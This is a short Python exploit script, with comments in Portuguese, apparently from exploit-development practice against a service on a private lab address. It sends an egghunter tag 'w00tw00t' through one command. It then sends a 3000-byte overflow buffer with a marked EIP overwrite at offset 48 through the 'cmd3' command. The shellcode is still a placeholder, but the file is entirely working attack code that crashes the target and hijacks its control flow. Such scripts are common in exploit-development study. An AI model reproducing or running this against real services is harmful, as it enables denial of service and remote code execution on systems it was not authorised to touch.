#!/usr/bin/python
# -*- coding: UTF-8 -*-
# Autor: 1º Ten Chitolina - 0x4rt3mis

import socket
import struct

IP = "192.168.122.49"
PORT = 2050

# 1º Estágio
shellcode = b'w00tw00t'

# 2º Estágio
payload = 3000 # Tamanho do Buffer
buffer = b"A" * 48 
buffer += b"B" * 4 # EIP
buffer += b"C" * (payload - len(buffer))

# Envio do Primeiro Estágio
print(b"Enviando payload no comando ajuda")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((IP, PORT))
r = s.recv(1024)
print(r)
s.send(b"sair " + shellcode + b"\r\n")
s.close()

# Envio do Segundo Estágio
print(b"Enviando payload no comando cmd3")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((IP, PORT))
r = s.recv(1024)
print(r)
s.send(b"cmd3 /.:/" + buffer + b"\r\n")
s.close()
